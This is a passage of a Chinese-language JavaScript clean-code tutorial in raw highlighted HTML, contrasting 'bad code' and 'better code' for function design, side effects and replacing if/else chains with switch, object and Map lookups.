class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token string">'Foo'</span><span class="token punctuation">,</span>  body<span class="token punctuation">:</span> <span class="token string">'Bar'</span><span class="token punctuation">,</span>  buttonText<span class="token punctuation">:</span> <span class="token string">'Baz'</span><span class="token punctuation">,</span>  cancellable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、单一化处理"><a href="#2、单一化处理" class="headerlink" title="2、单一化处理"></a>2、单一化处理</h3><p>一个方法里面最好只做一件事，不要过多的处理，这样代码的可读性非常高</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">function</span> <span class="token function">emailClients</span><span class="token punctuation">(</span>clients<span class="token punctuation">)</span> <span class="token punctuation">{</span>  clients<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> clientRecord <span class="token operator">=</span> database<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>clientRecord<span class="token punctuation">.</span><span class="token function">isActive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">email</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">function</span> <span class="token function">emailActiveClients</span><span class="token punctuation">(</span>clients<span class="token punctuation">)</span> <span class="token punctuation">{</span>  clients    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>isActiveClient<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">isActiveClient</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> clientRecord <span class="token operator">=</span> database<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> clientRecord<span class="token punctuation">.</span><span class="token function">isActive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、对象设置默认属性"><a href="#3、对象设置默认属性" class="headerlink" title="3、对象设置默认属性"></a>3、对象设置默认属性</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">const</span> menuConfig <span class="token operator">=</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>  body<span class="token punctuation">:</span> <span class="token string">'Bar'</span><span class="token punctuation">,</span>  buttonText<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>  cancellable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">createMenu</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token punctuation">{</span>  config<span class="token punctuation">.</span>title <span class="token operator">=</span> config<span class="token punctuation">.</span>title <span class="token operator">||</span> <span class="token string">'Foo'</span><span class="token punctuation">;</span>  config<span class="token punctuation">.</span>body <span class="token operator">=</span> config<span class="token punctuation">.</span>body <span class="token operator">||</span> <span class="token string">'Bar'</span><span class="token punctuation">;</span>  config<span class="token punctuation">.</span>buttonText <span class="token operator">=</span> config<span class="token punctuation">.</span>buttonText <span class="token operator">||</span> <span class="token string">'Baz'</span><span class="token punctuation">;</span>  config<span class="token punctuation">.</span>cancellable <span class="token operator">=</span> config<span class="token punctuation">.</span>cancellable <span class="token operator">!==</span> undefined <span class="token operator">?</span> config<span class="token punctuation">.</span>cancellable <span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">createMenu</span><span class="token punctuation">(</span>menuConfig<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">const</span> menuConfig <span class="token operator">=</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token string">'Order'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 'body' key 缺失</span>  buttonText<span class="token punctuation">:</span> <span class="token string">'Send'</span><span class="token punctuation">,</span>  cancellable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">createMenu</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token punctuation">{</span>  config <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token string">'Foo'</span><span class="token punctuation">,</span>    body<span class="token punctuation">:</span> <span class="token string">'Bar'</span><span class="token punctuation">,</span>    buttonText<span class="token punctuation">:</span> <span class="token string">'Baz'</span><span class="token punctuation">,</span>    cancellable<span class="token punctuation">:</span> <span class="token boolean">true</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// config 就变成了: {title: "Order", body: "Bar", buttonText: "Send", cancellable: true}</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token function">createMenu</span><span class="token punctuation">(</span>menuConfig<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、避免副作用"><a href="#4、避免副作用" class="headerlink" title="4、避免副作用"></a>4、避免副作用</h3><p>函数接收一个值返回一个新值，除此之外的行为我们都称之为副作用，比如修改全局变量、对文件进行 IO 操作等。</p><p>当函数确实需要副作用时，比如对文件进行 IO 操作时，请不要用多个函数/类进行文件操作，有且仅用一个函数/类来处理。也就是说副作用需要在唯一的地方处理。</p><p>副作用的三大天坑：随意修改可变数据类型、随意分享没有数据结构的状态、没有在统一地方处理副作用。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token comment" spellcheck="true">// 全局变量被一个函数引用</span><span class="token comment" spellcheck="true">// 现在这个变量从字符串变成了数组，如果有其他的函数引用，会发生无法预见的错误。</span><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">'Ryan McDermott'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">splitIntoFirstAndLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  name <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">splitIntoFirstAndLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ['Ryan', 'McDermott'];</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">'Ryan McDermott'</span><span class="token punctuation">;</span><span class="token keyword">var</span> newName <span class="token operator">=</span> <span class="token function">splitIntoFirstAndLastName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">function</span> <span class="token function">splitIntoFirstAndLastName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> name<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 'Ryan McDermott';</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newName<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ['Ryan', 'McDermott'];</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 JavaScript 中，基本类型通过赋值传递，对象和数组通过引用传递。以引用传递为例：</p><p>假如我们写一个购物车，通过 <code>addItemToCart()</code>方法添加商品到购物车，修改 <code>购物车数组</code>。此时调用 <code>purchase()</code>方法购买，由于引用传递，获取的 <code>购物车数组</code>正好是最新的数据。</p><p>看起来没问题对不对？</p><p>如果当用户点击购买时，网络出现故障， <code>purchase()</code>方法一直在重复调用，与此同时用户又添加了新的商品，这时网络又恢复了。那么 <code>purchase()</code>方法获取到 <code>购物车数组</code>就是错误的。</p><p>为了避免这种问题，我们需要在每次新增商品时，克隆 <code>购物车数组</code>并返回新的数组。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">const</span> addItemToCart <span class="token operator">=</span> <span class="token punctuation">(</span>cart<span class="token punctuation">,</span> item<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  cart<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> item<span class="token punctuation">,</span> date<span class="token punctuation">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">const</span> addItemToCart <span class="token operator">=</span> <span class="token punctuation">(</span>cart<span class="token punctuation">,</span> item<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span>cart<span class="token punctuation">,</span> <span class="token punctuation">{</span>item<span class="token punctuation">,</span> date<span class="token punctuation">:</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、全局方法"><a href="#5、全局方法" class="headerlink" title="5、全局方法"></a>5、全局方法</h3><p>在 JavaScript 中，永远不要污染全局，会在生产环境中产生难以预料的 bug。举个例子，比如你在 <code>Array.prototype</code>上新增一个 <code>diff</code>方法来判断两个数组的不同。而你同事也打算做类似的事情，不过他的 <code>diff</code>方法是用来判断两个数组首位元素的不同。很明显你们方法会产生冲突，遇到这类问题我们可以用 ES2015/ES6 的语法来对 <code>Array</code>进行扩展。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span>Array<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>diff <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">diff</span><span class="token punctuation">(</span>comparisonArray<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>comparisonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>elem <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">!</span>hash<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">class</span> <span class="token class-name">SuperArray</span> <span class="token keyword">extends</span> <span class="token class-name">Array</span> <span class="token punctuation">{</span>  <span class="token function">diff</span><span class="token punctuation">(</span>comparisonArray<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>comparisonArray<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>elem <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">!</span>hash<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6、避免类型检查"><a href="#6、避免类型检查" class="headerlink" title="6、避免类型检查"></a>6、避免类型检查</h3><p>JavaScript 是无类型的，意味着你可以传任意类型参数，这种自由度很容易让人困扰，不自觉的就会去检查类型。仔细想想是你真的需要检查类型还是你的 API 设计有问题？</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">function</span> <span class="token function">travelToTexas</span><span class="token punctuation">(</span>vehicle<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>vehicle <span class="token keyword">instanceof</span> <span class="token class-name">Bicycle</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    vehicle<span class="token punctuation">.</span><span class="token function">pedal</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>currentLocation<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Location</span><span class="token punctuation">(</span><span class="token string">'texas'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>vehicle <span class="token keyword">instanceof</span> <span class="token class-name">Car</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    vehicle<span class="token punctuation">.</span><span class="token function">drive</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>currentLocation<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Location</span><span class="token punctuation">(</span><span class="token string">'texas'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">function</span> <span class="token function">travelToTexas</span><span class="token punctuation">(</span>vehicle<span class="token punctuation">)</span> <span class="token punctuation">{</span>  vehicle<span class="token punctuation">.</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>currentLocation<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Location</span><span class="token punctuation">(</span><span class="token string">'texas'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你需要做静态类型检查，比如字符串、整数等，推荐使用 TypeScript，不然你的代码会变得又臭又长。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">function</span> <span class="token function">combine</span><span class="token punctuation">(</span>val1<span class="token punctuation">,</span> val2<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> val1 <span class="token operator">===</span> <span class="token string">'number'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> val2 <span class="token operator">===</span> <span class="token string">'number'</span> <span class="token operator">||</span>      <span class="token keyword">typeof</span> val1 <span class="token operator">===</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> val2 <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> val1 <span class="token operator">+</span> val2<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Must be of type String or Number'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">function</span> <span class="token function">combine</span><span class="token punctuation">(</span>val1<span class="token punctuation">,</span> val2<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> val1 <span class="token operator">+</span> val2<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="复杂条件判断"><a href="#复杂条件判断" class="headerlink" title="复杂条件判断"></a>复杂条件判断</h2><p>我们编写js代码时经常遇到复杂逻辑判断的情况，通常大家可以用if/else或者switch来实现多个条件判断，但这样会有个问题，随着逻辑复杂度的增加，代码中的if/else/switch会变得越来越臃肿，越来越看不懂，那么如何更优雅的写判断逻辑</p><h3 id="1、if-else"><a href="#1、if-else" class="headerlink" title="1、if/else"></a>1、if/else</h3><p>点击列表按钮事件</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/** * 按钮点击事件 * @param {number} status 活动状态：1 开团进行中 2 开团失败 3 商品售罄 4 开团成功 5 系统取消 */</span><span class="token keyword">const</span> onButtonClick <span class="token operator">=</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'processing'</span><span class="token punctuation">)</span>    <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'IndexPage'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'fail'</span><span class="token punctuation">)</span>    <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'FailPage'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'fail'</span><span class="token punctuation">)</span>    <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'FailPage'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>    <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'SuccessPage'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>status <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'cancel'</span><span class="token punctuation">)</span>    <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'CancelPage'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'other'</span><span class="token punctuation">)</span>    <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'Index'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面我们可以看到的是通过不同的状态来做不同的事情，代码看起来非常不好看，大家可以很轻易的提出这段代码的改写方案，switch出场：</p><h3 id="2、switch-case"><a href="#2、switch-case" class="headerlink" title="2、switch/case"></a>2、switch/case</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/** * 按钮点击事件 * @param {number} status 活动状态：1 开团进行中 2 开团失败 3 商品售罄 4 开团成功 5 系统取消 */</span><span class="token keyword">const</span> onButtonClick <span class="token operator">=</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>  <span class="token keyword">switch</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>      <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'processing'</span><span class="token punctuation">)</span>      <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'IndexPage'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>      <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'fail'</span><span class="token punctuation">)</span>      <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'FailPage'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>      <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span>      <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'SuccessPage'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>      <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'cancel'</span><span class="token punctuation">)</span>      <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'CancelPage'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>      <span class="token function">sendLog</span><span class="token punctuation">(</span><span class="token string">'other'</span><span class="token punctuation">)</span>      <span class="token function">jumpTo</span><span class="token punctuation">(</span><span class="token string">'Index'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样看起来比if/else清晰多了，细心的同学也发现了小技巧，case 2和case 3逻辑一样的时候，可以省去执行语句和break，则case 2的情况自动执行case 3的逻辑。</p><h3 id="3、存放到Object"><a href="#3、存放到Object" class="headerlink" title="3、存放到Object"></a>3、存放到Object</h3><p>将判断条件作为对象的属性名，将处理逻辑作为对象的属性值，在按钮点击的时候，通过对象属性查找的方式来进行逻辑判断，这种写法特别适合一元条件判断的情况。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'processing'</span><span class="token punctuation">,</span><span class="token string">'IndexPage'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'fail'</span><span class="token punctuation">,</span><span class="token string">'FailPage'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'fail'</span><span class="token punctuation">,</span><span class="token string">'FailPage'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'success'</span><span class="token punctuation">,</span><span class="token string">'SuccessPage'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'cancel'</span><span class="token punctuation">,</span><span class="token string">'CancelPage'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">'default'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'other'</span><span class="token punctuation">,</span><span class="token string">'Index'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * 按钮点击事件 * @param {number} status 活动状态：1开团进行中 2开团失败 3 商品售罄 4 开团成功 5 系统取消 */</span><span class="token keyword">const</span> onButtonClick <span class="token operator">=</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>  <span class="token keyword">let</span> action <span class="token operator">=</span> actions<span class="token punctuation">[</span>status<span class="token punctuation">]</span> <span class="token operator">||</span> actions<span class="token punctuation">[</span><span class="token string">'default'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      logName <span class="token operator">=</span> action<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      pageName <span class="token operator">=</span> action<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token function">sendLog</span><span class="token punctuation">(</span>logName<span class="token punctuation">)</span>  <span class="token function">jumpTo</span><span class="token punctuation">(</span>pageName<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、存放到Map"><a href="#4、存放到Map" class="headerlink" title="4、存放到Map"></a>4、存放到Map</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">[</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'processing'</span><span class="token punctuation">,</span><span class="token string">'IndexPage'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'fail'</span><span class="token punctuation">,</span><span class="token string">'FailPage'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'fail'</span><span class="token punctuation">,</span><span class="token string">'FailPage'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'success'</span><span class="token punctuation">,</span><span class="token string">'SuccessPage'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'cancel'</span><span class="token punctuation">,</span><span class="token string">'CancelPage'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token string">'default'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'other'</span><span class="token punctuation">,</span><span class="token string">'Index'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">/** * 